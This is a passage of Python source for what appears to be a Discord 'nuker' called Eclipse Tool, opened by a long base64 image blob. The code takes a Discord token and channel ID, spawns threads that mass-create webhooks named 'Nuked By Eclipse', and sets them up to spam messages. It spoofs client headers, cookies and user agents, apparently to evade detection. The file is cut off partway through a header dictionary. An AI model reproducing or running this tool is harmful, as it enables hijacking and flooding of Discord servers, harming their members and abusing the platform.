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"

            ids = []
            for x in range(1):

                r = requests.post(url,headers=header,json={'name':'Nuked By Eclipse'})

                try:
                    ids.append(r.json()['id'])
                except Exception as e:
                    print('')

                length = len(ids)
                for i in range(length):
                    header2 = {
                        "authority": "discord.com",
                        "method": "POST",
                        "path": f"/api/v9/webhooks/{ids[i]}",
                        "scheme": "https",
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US",
                        "Authorization": f'{tukan4}',
                        "content-length": "0",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        'referer': 'https://discord.com/channels/@me',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": useragent(),
                        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                    }
                    url1 = f'https://discord.com/api/v9/webhooks/{ids[i]}'
                    t = requests.patch(url1,headers=header2,json={'avatar':url2})

        threads = []

        for x in range(10):
            t = threading.Thread(target=spammer)
            t.daemon = True
            t.start()
            threads.append(t)

        for thread in threads:
            t.join()

        print("Finished! Created 10 webhooks named *Nuked by Eclipse* and with avatars named *Eclipse*")

    elif options2 in ['6','06']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Webhook Maker & Spammer")

      print(f'''
      {Fore.RED}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀      ███▄ ▄███▓ ▄▄▄      ▀██ ▄█▀▓█████ ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒      ▓██▒▀█▀ ██▒▒████▄     ██▄█▒ ▓█   ▀▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░      ▓██    ▓██░▒██  ▀█▄  ▓███▄░ ▒███  ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄      ▒██    ▒██ ░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ▒▒██▒   ░██▒ ▓█   ▓██ ▒██▒ █▄░▒████░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░░ ▒░   ░  ░ ▒▒   ▓▒█ ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░    ░░  ░      ░  ░   ▒▒  ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░      ░      ░     ░   ▒   ░ ░░ ░    ░     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░       ░       ░         ░   ░  ░      ░     ░     



      ''')
      chanid = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the channel id you want to make the webhooks in and spam them?: ''')
      msg = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What message do you want to spam?: ''')
      tukan3 = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token to use?: ''')

      print("Starting Now...")

      def spammer():
          url = f'https://discord.com/api/v9/channels/{chanid}/webhooks'

          def randstr(lenn):
              alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
              text = ''
              for i in range(0, lenn):
                  text += alpha[random.randint(0, len(alpha) - 1)]
              return text


          header = {
              "authority": "discord.com",
              "method": "POST",
              "path": f"/api/v9/channels/{chanid}/webhooks",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{tukan3}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
